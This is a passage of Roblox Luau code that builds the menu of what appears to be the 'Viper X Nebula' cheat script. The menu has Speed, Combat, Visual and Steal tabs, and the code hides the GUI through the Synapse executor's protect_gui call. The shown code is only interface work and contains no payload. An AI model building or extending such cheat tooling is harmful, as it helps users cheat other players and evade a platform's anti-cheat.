    local applyUILayoutSettings
    local customRows = {}
    local customRowsById = {}
    local customRowLabelCounts = {}
    _G.__VIPER_CUSTOM_ROWS = customRows
    _G.__VIPER_CUSTOM_ROWS_BY_ID = customRowsById

    local ROW_BG = Color3.fromRGB(10,10,10)
    local ROW_BORDER = Color3.fromRGB(50,50,50)
    local WHITE = Color3.fromRGB(255,255,255)
    local INP = Color3.fromRGB(15,15,15)
    local GUI_W, GUI_H = 380, 540

    local GUI_NAMES = {"ViperDuels", "ViperMobilePanel",
                       "ViperSpeedIndicator", "ViperBootErrors"}

    local _okCg, _coreGui = pcall(function() return game:GetService("CoreGui") end)
    local _pgOld = LP:FindFirstChild("PlayerGui")
    for _, n in ipairs(GUI_NAMES) do
        if _okCg and _coreGui then
            local okFind, oldCg = pcall(function() return _coreGui:FindFirstChild(n) end)
            if okFind and oldCg then pcall(function() oldCg:Destroy() end) end
        end
        if _pgOld then
            local okFind2, o = pcall(function() return _pgOld:FindFirstChild(n) end)
            if okFind2 and o then pcall(function() o:Destroy() end) end
        end
    end

    gui = Instance.new("ScreenGui")
    gui.Name = "ViperDuels"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 10
    gui.IgnoreGuiInset = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
    local guiOk = pcall(function() gui.Parent = game:GetService("CoreGui") end)
    if not guiOk then gui.Parent = LP:WaitForChild("PlayerGui") end

    main = Instance.new("Frame", gui)
    main.Name = "MainFrame"
    main.Size = UDim2.new(0, GUI_W, 0, 540)
    main.Position = UDim2.new(0, 20, 0, 2)
    main.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    main.BackgroundTransparency = 0.04
    main.BorderSizePixel = 0
    main.ClipsDescendants = true

    -- Actual background image layer. This must exist before applyBackgroundMode runs.
    -- Low ZIndex keeps it behind the menu controls and decorative overlays.
    local backgroundImageLayer = Instance.new("ImageLabel")
    backgroundImageLayer.Name = "BackgroundImage"
    backgroundImageLayer.Size = UDim2.fromScale(1, 1)
    backgroundImageLayer.Position = UDim2.fromScale(0, 0)
    backgroundImageLayer.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    backgroundImageLayer.BackgroundTransparency = 1
    backgroundImageLayer.BorderSizePixel = 0
    backgroundImageLayer.Image = ""
    backgroundImageLayer.ImageTransparency = 1
    backgroundImageLayer.ScaleType = Enum.ScaleType.Crop
    backgroundImageLayer.ResampleMode = Enum.ResamplerMode.Default
    backgroundImageLayer.Active = false
    backgroundImageLayer.Selectable = false
    -- Keep the image at the back. Content pages use higher ZIndex values, so settings labels stay readable.
    backgroundImageLayer.ZIndex = 1
    backgroundImageLayer.Parent = main
    -- Match the main menu's 16px rounded corners so the image does not look square.
    local backgroundImageCorner = Instance.new("UICorner")
    backgroundImageCorner.CornerRadius = UDim.new(0, 16)
    backgroundImageCorner.Parent = backgroundImageLayer

    -- Incoming wallpaper sits above the current one and fades in only after
    -- Roblox has loaded its image. This prevents the UI from flashing to grey.
    local backgroundImageTransition = Instance.new("ImageLabel")
    backgroundImageTransition.Name = "BackgroundImageTransition"
    backgroundImageTransition.Size = UDim2.fromScale(1, 1)
    backgroundImageTransition.Position = UDim2.fromScale(0, 0)
    backgroundImageTransition.BackgroundTransparency = 1
    backgroundImageTransition.BorderSizePixel = 0
    backgroundImageTransition.Image = ""
    backgroundImageTransition.ImageTransparency = 1
    backgroundImageTransition.ScaleType = Enum.ScaleType.Crop
    backgroundImageTransition.ResampleMode = Enum.ResamplerMode.Default
    backgroundImageTransition.Active = false
    backgroundImageTransition.Selectable = false
    backgroundImageTransition.Visible = false
    backgroundImageTransition.ZIndex = 1
    backgroundImageTransition.Parent = main
    local backgroundTransitionCorner = Instance.new("UICorner")
    backgroundTransitionCorner.CornerRadius = UDim.new(0, 16)
    backgroundTransitionCorner.Parent = backgroundImageTransition

    -- Keep the tint at the same low layer as the wallpaper. It is created
    -- before the tabs/settings controls so it cannot cover their text.
    local backgroundShadeLayer = Instance.new("Frame")
    backgroundShadeLayer.Name = "BackgroundShade"
    backgroundShadeLayer.Size = UDim2.fromScale(1, 1)
    backgroundShadeLayer.Position = UDim2.fromScale(0, 0)
    backgroundShadeLayer.BackgroundColor3 = Color3.fromRGB(5, 5, 9)
    backgroundShadeLayer.BackgroundTransparency = 0.28
    backgroundShadeLayer.BorderSizePixel = 0
    backgroundShadeLayer.Active = false
    backgroundShadeLayer.Selectable = false
    backgroundShadeLayer.Visible = false
    backgroundShadeLayer.ZIndex = 1
    backgroundShadeLayer.Parent = main
    local backgroundShadeCorner = Instance.new("UICorner")
    backgroundShadeCorner.CornerRadius = UDim.new(0, 16)
    backgroundShadeCorner.Parent = backgroundShadeLayer

    -- One master UIScale drives both the Settings slider and entrance/expand animations.
    -- Two UIScale instances on the same frame can fight each other and make UI Scale appear broken.
    local function getViperUIScaleBase()
        return math.clamp(tonumber(uiScaleValue) or 78, 40, 180) / 100
    end
    local mainEntranceScale = Instance.new("UIScale")
    mainEntranceScale.Name = "MainUIScale"
    mainEntranceScale.Scale = getViperUIScaleBase() * 0.94
    mainEntranceScale.Parent = main
    mainUIScale = mainEntranceScale
    task.defer(function()
        task.wait(0.08)
        if main and main.Parent and mainEntranceScale and mainEntranceScale.Parent then
            TS:Create(mainEntranceScale, TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Scale = getViperUIScaleBase()
            }):Play()
        end
    end)

    -- Subtle Halloween background: shaded, ribbed pumpkins instead of flat emoji.
    local pumpkinRainLayer = Instance.new("Frame")
    pumpkinRainLayer.Name = "PumpkinRainBackground"
    pumpkinRainLayer.Size = UDim2.fromScale(1, 1)
    pumpkinRainLayer.BackgroundTransparency = 1
    pumpkinRainLayer.BorderSizePixel = 0
    pumpkinRainLayer.ClipsDescendants = true
    pumpkinRainLayer.ZIndex = 1
    pumpkinRainLayer.Visible = false
    pumpkinRainLayer.Parent = main

    local function createUIFallPumpkin(index)
        local root = Instance.new("Frame", pumpkinRainLayer)
        root.Name = "DetailedFallingPumpkin" .. index
        local size = math.random(22, 29)
        root.Size = UDim2.fromOffset(size, size)
        root.BackgroundTransparency = 1
        root.BorderSizePixel = 0
        root.AnchorPoint = Vector2.new(0.5, 0.5)
        root.Position = UDim2.fromScale(math.random(10, 90) / 100, math.random(55, 100) / 100)
        root.ZIndex = 1

        local shadow = Instance.new("Frame", root)
        shadow.Size = UDim2.new(0.88, 0, 0.78, 0)
        shadow.Position = UDim2.new(0.06, 0, 0.18, 0)
        shadow.BackgroundColor3 = Color3.fromRGB(55, 12, 8)
        shadow.BackgroundTransparency = 0.66
        shadow.BorderSizePixel = 0
        shadow.ZIndex = 1
        Instance.new("UICorner", shadow).CornerRadius = UDim.new(1, 0)

        local body = Instance.new("Frame", root)
        body.Size = UDim2.new(0.8, 0, 0.72, 0)
        body.Position = UDim2.new(0.1, 0, 0.2, 0)
        body.BackgroundColor3 = Color3.fromRGB(230, 74, 9)
        body.BackgroundTransparency = 0.56
        body.BorderSizePixel = 0
        body.ZIndex = 1
        Instance.new("UICorner", body).CornerRadius = UDim.new(1, 0)
        local grad = Instance.new("UIGradient", body)
        grad.Rotation = 90
        grad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 164, 46)),
            ColorSequenceKeypoint.new(0.48, Color3.fromRGB(241, 91, 13)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(116, 28, 12)),
        })

        for rib = 1, 5 do
            local lobe = Instance.new("Frame", root)
            local widths = {0.21, 0.24, 0.27, 0.24, 0.21}
            lobe.Size = UDim2.new(widths[rib], 0, 0.64, 0)
            lobe.Position = UDim2.new(0.025 + (rib - 1) * 0.17, 0, 0.26, 0)
            lobe.BackgroundColor3 = (rib % 2 == 0) and Color3.fromRGB(255, 129, 19) or Color3.fromRGB(199, 55, 9)
            lobe.BackgroundTransparency = 0.60
            lobe.BorderSizePixel = 0
            lobe.ZIndex = 1
            Instance.new("UICorner", lobe).CornerRadius = UDim.new(1, 0)
        end

        local shine = Instance.new("Frame", root)
        shine.Size = UDim2.new(0.1, 0, 0.32, 0)
        shine.Position = UDim2.new(0.25, 0, 0.3, 0)
        shine.BackgroundColor3 = Color3.fromRGB(255, 218, 129)
        shine.BackgroundTransparency = 0.70
        shine.BorderSizePixel = 0
        shine.ZIndex = 1
        Instance.new("UICorner", shine).CornerRadius = UDim.new(1, 0)

        local stem = Instance.new("Frame", root)
        stem.Size = UDim2.new(0.15, 0, 0.23, 0)
        stem.Position = UDim2.new(0.43, 0, 0.035, 0)
        stem.Rotation = -12
        stem.BackgroundColor3 = Color3.fromRGB(73, 89, 28)
        stem.BackgroundTransparency = 0.58
        stem.BorderSizePixel = 0
        stem.ZIndex = 1
        Instance.new("UICorner", stem).CornerRadius = UDim.new(0.3, 0)

        return root
    end

    for particleIndex = 1, 3 do
        local pumpkin = createUIFallPumpkin(particleIndex)
        task.spawn(function()
            local speed = math.random(3, 6) / 1000
            local drift = math.random(-2, 2) / 1000
            local phase = math.random() * math.pi * 2
            local t = 0
            while gui and gui.Parent and pumpkinRainLayer.Parent and pumpkin.Parent do
                t += 0.04
                local pos = pumpkin.Position
                local nextY = pos.Y.Scale + speed
                local nextX = pos.X.Scale + drift + math.sin(t + phase) * 0.0005
                if nextY > 1.05 then
                    nextY = math.random(48, 60) / 100
                    nextX = math.random(10, 90) / 100
                end
                if nextX > 1.05 then nextX = -0.05 end
                if nextX < -0.05 then nextX = 1.05 end
                pumpkin.Position = UDim2.fromScale(nextX, nextY)
                pumpkin.Rotation = (pumpkin.Rotation + 0.08) % 360
                task.wait(0.04)
            end
        end)
    end

    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)

    local mainStroke = Instance.new("UIStroke", main)
    mainStroke.Name = "MainStroke"
    mainStroke.Color = Color3.fromRGB(255, 255, 255)
    mainStroke.Thickness = 1.8
    mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

    local mainGrad = Instance.new("UIGradient", mainStroke)
    mainGrad.Name = "RotatingBorderGrad"
    mainGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 110, 20)),
        ColorSequenceKeypoint.new(0.25, Color3.fromRGB(45, 12, 35)),
        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 110, 20)),
        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(45, 12, 35)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 110, 20)),
    })
    mainGrad.Rotation = 0

    mainGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 110, 20)),
        ColorSequenceKeypoint.new(0.18, Color3.fromRGB(35, 10, 28)),
        ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255, 110, 20)),
        ColorSequenceKeypoint.new(0.52, Color3.fromRGB(35, 10, 28)),
        ColorSequenceKeypoint.new(0.70, Color3.fromRGB(255, 110, 20)),
        ColorSequenceKeypoint.new(0.86, Color3.fromRGB(35, 10, 28)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 110, 20)),
    })

    task.spawn(function()
        local rot = 0
        while main and main.Parent and mainGrad and mainGrad.Parent do
            rot = (rot + 0.25) % 360
            mainGrad.Rotation = rot
            task.wait(0.03)
        end
    end)

    -- Reuse the existing master scale; do not create a second UIScale on MainFrame.
    if not mainUIScale or mainUIScale.Parent ~= main then
        mainUIScale = main:FindFirstChild("MainUIScale")
        if not mainUIScale then
            mainUIScale = Instance.new("UIScale")
            mainUIScale.Name = "MainUIScale"
            mainUIScale.Parent = main
        end
    end
    mainUIScale.Scale = math.clamp(tonumber(uiScaleValue) or 78, 40, 180) / 100

    -- TopBar matching Photo 1 and Photo 2
    local topBar = Instance.new("Frame", main)
    topBar.Name = "TopBar"
    topBar.Size = UDim2.new(1, 0, 0, 60)
    topBar.Position = UDim2.new(0, 0, 0, 0)
    topBar.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
    topBar.BackgroundTransparency = 0.1
    topBar.BorderSizePixel = 0
    topBar.ZIndex = 50

    local topTitle = Instance.new("TextLabel", topBar)
    topTitle.Name = "Title"
    topTitle.Size = UDim2.new(1, -24, 1, 0)
    topTitle.Position = UDim2.new(0, 12, 0, 0)
    topTitle.BackgroundTransparency = 1
    topTitle.Text = "V I P E R   X   N E B U L A"
    topTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    topTitle.Font = Enum.Font.GothamBlack
    topTitle.TextSize = 25
    topTitle.TextScaled = true
    topTitle.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    topTitle.TextStrokeTransparency = 1
    topTitle.TextXAlignment = Enum.TextXAlignment.Center
    topTitle.TextYAlignment = Enum.TextYAlignment.Center
    topTitle.ZIndex = 51
    local titleSizeLimit = Instance.new("UITextSizeConstraint")
    titleSizeLimit.MinTextSize = 18
    titleSizeLimit.MaxTextSize = 29
    titleSizeLimit.Parent = topTitle

    -- Search is placed in Settings to keep the header clean.

    -- Removed the Normal/Steal speed values from the top bar as requested.

    -- Forward declarations are important here: the expand/collapse handler is
    -- created before the two content containers further below.
    local tabBar, tabContent, transitionOverlay
    local isGuiExpanded = true
    local OPEN_H = 540
    local CLOSED_H = 60
    local expandAnimToken = 0

    local function setGuiExpanded(expanded, animate)
        isGuiExpanded = expanded
        if animate == nil then animate = true end
        local targetH = expanded and OPEN_H or CLOSED_H
        expandAnimToken += 1
        local myToken = expandAnimToken

        if animate then
            if expanded then
                if tabBar then tabBar.Visible = true end
                if tabContent then tabContent.Visible = true end

                -- Fade a dark glass curtain away as the panel opens.
                if transitionOverlay and transitionOverlay.Parent then
                    transitionOverlay.Visible = true
                    transitionOverlay.BackgroundTransparency = 0.20
                    TS:Create(transitionOverlay, TweenInfo.new(0.34, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                        BackgroundTransparency = 1
                    }):Play()
                    task.delay(0.36, function()
                        if myToken == expandAnimToken and isGuiExpanded and transitionOverlay and transitionOverlay.Parent then
                            transitionOverlay.Visible = false
                        end
                    end)
                end

                if mainEntranceScale and mainEntranceScale.Parent then
                    mainEntranceScale.Scale = getViperUIScaleBase() * 0.985
                    TS:Create(mainEntranceScale, TweenInfo.new(0.38, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                        Scale = getViperUIScaleBase()
                    }):Play()
                end
            else
                -- Gently dim the content before the frame folds up to its compact bar.
                if transitionOverlay and transitionOverlay.Parent and tabContent and tabContent.Visible then
                    transitionOverlay.Visible = true
                    transitionOverlay.BackgroundTransparency = 1
                    TS:Create(transitionOverlay, TweenInfo.new(0.13, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                        BackgroundTransparency = 0.20
                    }):Play()
                end
                if mainEntranceScale and mainEntranceScale.Parent then
                    TS:Create(mainEntranceScale, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                        Scale = getViperUIScaleBase() * 0.99
                    }):Play()
                end
            end

            TS:Create(main, TweenInfo.new(expanded and 0.38 or 0.30, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, GUI_W, 0, targetH)
            }):Play()

            if not expanded then
                task.delay(0.31, function()
                    if myToken == expandAnimToken and not isGuiExpanded then
                        if tabBar then tabBar.Visible = false end
                        if tabContent then tabContent.Visible = false end
                        if transitionOverlay and transitionOverlay.Parent then
                            transitionOverlay.Visible = false
                            transitionOverlay.BackgroundTransparency = 1
                        end
                    end
                end)
            end
        else
            main.Size = UDim2.new(0, GUI_W, 0, targetH)
            if tabBar then tabBar.Visible = expanded end
            if tabContent then tabContent.Visible = expanded end
            if transitionOverlay then
                transitionOverlay.Visible = false
                transitionOverlay.BackgroundTransparency = 1
            end
            if mainEntranceScale and mainEntranceScale.Parent then mainEntranceScale.Scale = getViperUIScaleBase() end
        end
    end

    -- Smooth rounded corners on topBar matching main Frame
    Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 16)
    topTitle.Active = false

    -- Scale-aware smooth dragging + click-to-toggle directly on topBar!
    drag(main, topBar, nil, function()
        if not (normalTopBox and normalTopBox:IsFocused()) and not (stealTopBox and stealTopBox:IsFocused()) then
            setGuiExpanded(not isGuiExpanded, true)
        end
    end)

    showGui = function()
        if not main then return end
        main.Visible = true
        setGuiExpanded(true, true)
    end

    hideGui = function()
        if not main then return end
        setGuiExpanded(not isGuiExpanded, true)
    end

    tabBar = Instance.new("Frame", main)
    tabBar.Name = "TabBar"
    tabBar.Size = UDim2.new(1, -16, 0, 40)
    tabBar.Position = UDim2.new(0, 8, 0, 64)
    tabBar.BackgroundTransparency = 1
    tabBar.ZIndex = 10

    local tabLayout = Instance.new("UIListLayout", tabBar)
    tabLayout.FillDirection = Enum.FillDirection.Horizontal
    tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    tabLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    tabLayout.Padding = UDim.new(0, 2)

    tabContent = Instance.new("Frame", main)
    tabContent.Name = "TabContent"
    tabContent.Size = UDim2.new(1, -12, 1, -112)
    tabContent.Position = UDim2.new(0, 6, 0, 108)
    tabContent.BackgroundTransparency = 1
    tabContent.ClipsDescendants = true
    tabContent.ZIndex = 5

    -- Reusable transition curtain: keeps tab changes smooth without changing
    -- any feature rows' individual transparency values.
    transitionOverlay = Instance.new("Frame", tabContent)
    transitionOverlay.Name = "TabTransitionCurtain"
    transitionOverlay.Size = UDim2.fromScale(1, 1)
    transitionOverlay.Position = UDim2.fromScale(0, 0)
    transitionOverlay.BackgroundColor3 = Color3.fromRGB(9, 9, 13)
    transitionOverlay.BackgroundTransparency = 1
    transitionOverlay.BorderSizePixel = 0
    transitionOverlay.Active = false
    transitionOverlay.Visible = false
    transitionOverlay.ZIndex = 40

    local tabs = {"Speed", "Combat", "Visual", "Steal", "Settings", "Keybinds"}
    tabButtons = {}
    local contentPages = {}

    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton", tabBar)
        btn.Size = UDim2.new(1 / #tabs, -3, 1, -4)
        btn.BackgroundColor3 = Color3.fromRGB(26, 26, 34)
        btn.BackgroundTransparency = 0.82
        btn.BorderSizePixel = 0
        btn.Text = string.upper(name)
        btn.TextColor3 = Color3.fromRGB(120, 125, 145)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 8
        btn.AutoButtonColor = false
        btn.ZIndex = 11
        btn.ClipsDescendants = true
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 13)

        -- Tiny spring response makes tabs feel tactile on desktop and touch.
        local btnScale = Instance.new("UIScale", btn)
        btnScale.Name = "InteractionScale"
        btnScale.Scale = 1
        btn.MouseButton1Down:Connect(function()
            TS:Create(btnScale, TweenInfo.new(0.075, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Scale = 0.955
            }):Play()
        end)
        btn.MouseButton1Up:Connect(function()
            TS:Create(btnScale, TweenInfo.new(0.24, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Scale = 1.035
            }):Play()
            task.delay(0.16, function()
                if btnScale and btnScale.Parent then
                    TS:Create(btnScale, TweenInfo.new(0.16, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                        Scale = 1
                    }):Play()
                end
            end)
        end)
        btn.MouseEnter:Connect(function()
            TS:Create(btnScale, TweenInfo.new(0.16, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Scale = 1.025
            }):Play()
        end)
        btn.MouseLeave:Connect(function()
            TS:Create(btnScale, TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Scale = 1
            }):Play()
        end)

        local tabBgGrad = Instance.new("UIGradient", btn)
        tabBgGrad.Name = "TabBgGrad"
        tabBgGrad.Color = viperGradient(getThemeColor())
        tabBgGrad.Rotation = 0

        local tabStroke = Instance.new("UIStroke", btn)
        tabStroke.Name = "TabStroke"
        tabStroke.Color = getThemeColor()
        tabStroke.Thickness = 1.5
        tabStroke.Transparency = 1

        local underline = Instance.new("Frame", btn)
        underline.Name = "Underline"
        underline.Size = UDim2.new(0, 34, 0, 3)
        underline.Position = UDim2.new(0.5, 0, 1, -3)
        underline.AnchorPoint = Vector2.new(0.5, 0)
        underline.BackgroundColor3 = getThemeColor()
        underline.BorderSizePixel = 0
        underline.Visible = false
        underline.ZIndex = 12
        Instance.new("UICorner", underline).CornerRadius = UDim.new(1, 0)

        local page = Instance.new("ScrollingFrame", tabContent)
        page.Size = UDim2.new(1, 0, 1, 0)
        page.Position = UDim2.new(0, 0, 0, 0)
        page.BackgroundTransparency = 1
        page.BorderSizePixel = 0
        page.ClipsDescendants = true
        page.ScrollBarThickness = 2
        page.ScrollBarImageColor3 = getThemeColor()
        page.ScrollBarImageTransparency = 0.3
        page.CanvasSize = UDim2.new(0, 0, 0, 0)
        page.AutomaticCanvasSize = Enum.AutomaticSize.Y
        page.ScrollingDirection = Enum.ScrollingDirection.Y
        page.ZIndex = 6
        page.Visible = (i == 1)

        local layout = Instance.new("UIListLayout", page)
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout.Padding = UDim.new(0, 6)
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center

        local padding = Instance.new("UIPadding", page)
        padding.PaddingLeft = UDim.new(0, 8)
        padding.PaddingRight = UDim.new(0, 8)
        padding.PaddingTop = UDim.new(0, 6)
        padding.PaddingBottom = UDim.new(0, 20)

        contentPages[name] = page

        btn.MouseButton1Click:Connect(function()
            -- Clear the previous page immediately, then slide the requested one
            -- in beneath a fast glass fade. No gameplay callbacks are touched.
            for _, pg2 in pairs(contentPages) do
                if pg2 ~= page then
                    pg2.Visible = false
                    pg2.Position = UDim2.new(0, 0, 0, 0)
                end
            end
            page.Visible = true
            page.Position = UDim2.new(0, 9, 0, 0)
            TS:Create(page, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Position = UDim2.new(0, 0, 0, 0)
            }):Play()
            if transitionOverlay and transitionOverlay.Parent then
                transitionOverlay.Visible = true
                transitionOverlay.BackgroundTransparency = 0.22
                TS:Create(transitionOverlay, TweenInfo.new(0.27, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                    BackgroundTransparency = 1
                }):Play()
                task.delay(0.29, function()
                    if transitionOverlay and transitionOverlay.Parent then
                        transitionOverlay.Visible = false
                        transitionOverlay.BackgroundTransparency = 1
                    end
                end)
            end
            for _, b in ipairs(tabButtons) do
                local ul = b:FindFirstChild("Underline")
                if ul then ul.Visible = false end
                local bs = b:FindFirstChild("TabStroke")
                TS:Create(b, TweenInfo.new(0.2, Enum.EasingStyle.Quint), {
                    BackgroundTransparency = 1,
                    BackgroundColor3 = Color3.fromRGB(26, 26, 34),
                    TextColor3 = Color3.fromRGB(115, 120, 140)
                }):Play()
                if bs then TS:Create(bs, TweenInfo.new(0.2), {Transparency = 1}):Play() end
            end
            local ul = btn:FindFirstChild("Underline")
            if ul then
                ul.Visible = true
                ul.Size = UDim2.new(0, 0, 0, 3)
                TS:Create(ul, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                    Size = UDim2.new(0, 34, 0, 3)
                }):Play()
            end
            local bs = btn:FindFirstChild("TabStroke")
            TS:Create(btn, TweenInfo.new(0.22, Enum.EasingStyle.Quint), {
                BackgroundTransparency = 0.15,
                BackgroundColor3 = getThemeColor(),
                TextColor3 = Color3.fromRGB(245, 245, 255)
            }):Play()
            if bs then TS:Create(bs, TweenInfo.new(0.22), {Transparency = 0.3}):Play() end
        end)

        btn.MouseEnter:Connect(function()
            if btn:FindFirstChild("Underline") and btn.Underline.Visible then return end
            TS:Create(btn, TweenInfo.new(0.15), {
                BackgroundTransparency = 0.55,
                TextColor3 = Color3.fromRGB(215, 215, 230)
            }):Play()
        end)
        btn.MouseLeave:Connect(function()
            if btn:FindFirstChild("Underline") and btn.Underline.Visible then return end
            TS:Create(btn, TweenInfo.new(0.15), {
                BackgroundTransparency = 1,
                TextColor3 = Color3.fromRGB(115, 120, 140)
            }):Play()
        end)

        table.insert(tabButtons, btn)
    end

    if tabButtons[1] then
        local ul = tabButtons[1]:FindFirstChild("Underline")
        if ul then
            ul.Visible = true
            ul.Size = UDim2.new(0, 34, 0, 3)
        end
        tabButtons[1].BackgroundColor3 = Color3.fromRGB(255, 110, 20)
        tabButtons[1].BackgroundTransparency = 0.15
        tabButtons[1].TextColor3 = Color3.fromRGB(245, 245, 255)
        local bs = tabButtons[1]:FindFirstChild("TabStroke")
        if bs then bs.Transparency = 0.3 end
    end

    local pageCounters = {}

    local function getNextOrder(page)
        if not pageCounters[page] then pageCounters[page] = 0 end
        pageCounters[page] = pageCounters[page] + 1
        return pageCounters[page]
    end

    local function mkSect(page, txt)
        local f = Instance.new("Frame", page)
        f.Size = UDim2.new(1, 0, 0, 30)
        f.BackgroundTransparency = 1
        f.BorderSizePixel = 0
        f.LayoutOrder = getNextOrder(page)
        f.ZIndex = 7

        local accent = Instance.new("Frame", f)
        accent.Name = "SectAccent"
        accent.Size = UDim2.new(0, 3, 0, 15)
        accent.Position = UDim2.new(0, 5, 0.5, -7)
        accent.AnchorPoint = Vector2.new(0, 0.5)
        accent.BackgroundColor3 = getThemeColor()
        accent.BorderSizePixel = 0
        accent.ZIndex = 8
        Instance.new("UICorner", accent).CornerRadius = UDim.new(1, 0)
        local accentGrad = Instance.new("UIGradient", accent)
        accentGrad.Color = viperGradient(getThemeColor())
        accentGrad.Rotation = 90

        local l = Instance.new("TextLabel", f)
        l.Size = UDim2.new(0.5, -24, 1, 0)
        l.Position = UDim2.new(0, 14, 0, 0)
        l.BackgroundTransparency = 1
        l.Text = txt:upper()
        l.TextColor3 = Color3.fromRGB(235, 235, 245)
        l.Font = Enum.Font.GothamBlack
        l.TextSize = 11
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.TextStrokeColor3 = Color3.fromRGB(0,0,0)
        l.TextStrokeTransparency = 0.55
        l.ZIndex = 8

        local line = Instance.new("Frame", f)
        line.Name = "SectLine"
        line.Size = UDim2.new(0, 110, 0, 1)
        line.Position = UDim2.new(1, -6, 0.5, 0)
        line.AnchorPoint = Vector2.new(1, 0.5)
        line.BackgroundColor3 = getThemeColor()
        line.BorderSizePixel = 0
        line.ZIndex = 8
        local lineGrad = Instance.new("UIGradient", line)
        lineGrad.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0.00, 0.45),
            NumberSequenceKeypoint.new(1.00, 1.00),
        })

        return f
    end

    local function mkRow(page, h)
        local f = Instance.new("Frame", page)
        f.Size = UDim2.new(1, -4, 0, h or 42)
        f.BackgroundColor3 = Color3.fromRGB(22, 17, 25)
        f.BackgroundTransparency = 0.12
        f.BorderSizePixel = 0
        f.LayoutOrder = getNextOrder(page)
        f.ZIndex = 7
        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 11)

        local rowAccent = Instance.new("Frame", f)
        rowAccent.Name = "HalloweenRowAccent"
        rowAccent.Size = UDim2.new(0, 3, 0.58, 0)
        rowAccent.Position = UDim2.new(0, 0, 0.21, 0)
        rowAccent.BackgroundColor3 = Color3.fromRGB(255, 110, 20)
        rowAccent.BorderSizePixel = 0
        rowAccent.ZIndex = 8
        Instance.new("UICorner", rowAccent).CornerRadius = UDim.new(1, 0)

        local rowGlow = Instance.new("UIStroke", rowAccent)
        rowGlow.Color = Color3.fromRGB(255, 145, 45)
        rowGlow.Thickness = 1
        rowGlow.Transparency = 0.35

        local rowGrad = Instance.new("UIGradient", f)
        rowGrad.Name = "RowGrad"
        rowGrad.Rotation = 90
        rowGrad.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0.00, 0.00),
            NumberSequenceKeypoint.new(1.00, 0.30),
        })

        local rowStroke = Instance.new("UIStroke", f)
        rowStroke.Color = Color3.fromRGB(255, 110, 20)
        rowStroke.Thickness = 1.35
        rowStroke.Transparency = 0.18

        f.MouseEnter:Connect(function()
            local isCustomEditor = f.Name:match("^ViperUILayout_") ~= nil
            TS:Create(f, TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                BackgroundColor3 = isCustomEditor and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(38, 22, 28),
                BackgroundTransparency = isCustomEditor and 0 or 0.02
            }):Play()
            TS:Create(rowStroke, TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Color = getThemeColor(),
                Transparency = 0.12,
                Thickness = 1.7
            }):Play()
            TS:Create(rowAccent, TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 4, 0.72, 0),
                Position = UDim2.new(0, 0, 0.14, 0)
            }):Play()
        end)
        f.MouseLeave:Connect(function()
            local isCustomEditor = f.Name:match("^ViperUILayout_") ~= nil
            TS:Create(f, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundColor3 = isCustomEditor and Color3.fromRGB(0, 0, 0) or ROW_BG,
                BackgroundTransparency = isCustomEditor and 0 or 0.12
            }):Play()
            TS:Create(rowStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Color = ROW_BORDER,
                Transparency = 0.55,
                Thickness = 1.35
            }):Play()
            TS:Create(rowAccent, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 3, 0.58, 0),
                Position = UDim2.new(0, 0, 0.21, 0)
            }):Play()
        end)
        return f
    end

    local function mkLabel(row, txt)
        local l = Instance.new("TextLabel", row)
        l.Size = UDim2.new(0.50, 0, 1, 0)
